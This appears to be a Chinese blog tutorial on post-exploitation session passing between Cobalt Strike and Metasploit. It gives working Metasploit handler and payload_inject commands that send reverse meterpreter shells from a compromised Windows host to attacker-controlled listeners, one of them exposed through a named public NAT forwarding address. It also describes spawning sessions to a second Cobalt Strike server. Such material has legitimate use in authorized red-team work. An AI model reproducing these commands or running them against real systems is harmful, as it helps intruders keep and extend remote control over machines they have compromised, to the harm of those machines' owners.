**目录**

[当获取了CobaltStrike类型的session后，想派生一个MSF类型的shell](#t0 "当获取了CobaltStrike类型的session后，想派生一个MSF类型的shell")

[当获取了MSF类型的session后，想派生一个CobaltStrike类型的shell](#t1 "当获取了MSF类型的session后，想派生一个CobaltStrike类型的shell")

[当获取了CobaltStrike类型的session后，想派生一个shell给另一台CobaltStrike](#t2 "当获取了CobaltStrike类型的session后，想派生一个shell给另一台CobaltStrike")

* * *

### 当获取了CobaltStrike类型的session后，想派生一个MSF类型的shell

**在MSF上的操作：**

```
use exploit/multi/handler      
set payload windows/meterpreter/reverse_tcp      
set lhost 192.168.10.11      
set lport 4444      
exploit -j
```


![](https://img-blog.csdnimg.cn/20190804182025709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**在CobaltStrike上的操作**

开启一个监听器Listener，HOST和PORT填我们MSF监听的地址(这里需要注意，如果我们的MSF也是在内网中的话，需要将MSF的端口映射到公网地址)，这里我们将Kali的端口映射到了公网的 server.natappfree.cc:38615 (112.74.89.58:38615 )

![](https://img-blog.csdnimg.cn/2019080418252878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这里一定要注意，创建的Listener是foreign!

![](https://img-blog.csdnimg.cn/20190804182659211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后选中计算机，右键->Spawn，选择刚刚创建的监听器MSF，然后我们的MSF即可看到成功获取了meterpreter会话

![](https://img-blog.csdnimg.cn/20190804182317212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 当获取了MSF类型的session后，想派生一个CobaltStrike类型的shell

**注：只有meterpreter类型的session才能派生给CS**

我们现在获得了一个MSF的meterpreter类型的[session](https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020)，session id为1

首先在CobaltStrike上开启Listener，

![](https://img-blog.csdnimg.cn/20190813110033429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后在MSF中进行如下操作

```
use exploit/windows/local/payload_inject      
set payload windows/meterpreter/reverse_http      
set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true      
set lhost x.x.x.x               #cobaltstrike监听的ip      
set lport 14444                 #cobaltstrike监听的端口       
set session 1                   #这里是获得的session的id      
exploit
```


![](https://img-blog.csdnimg.cn/20190821183154128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这样，我们的CobaltStrike上就可以收到MSF弹回来的session了。

### 当获取了CobaltStrike类型的session后，想派生一个shell给另一台CobaltStrike

在两台CobaltStrike上都建立另一个CS的监听

![](https://img-blog.csdnimg.cn/20200428152303770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后在CS上spawn到这个监听即可。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)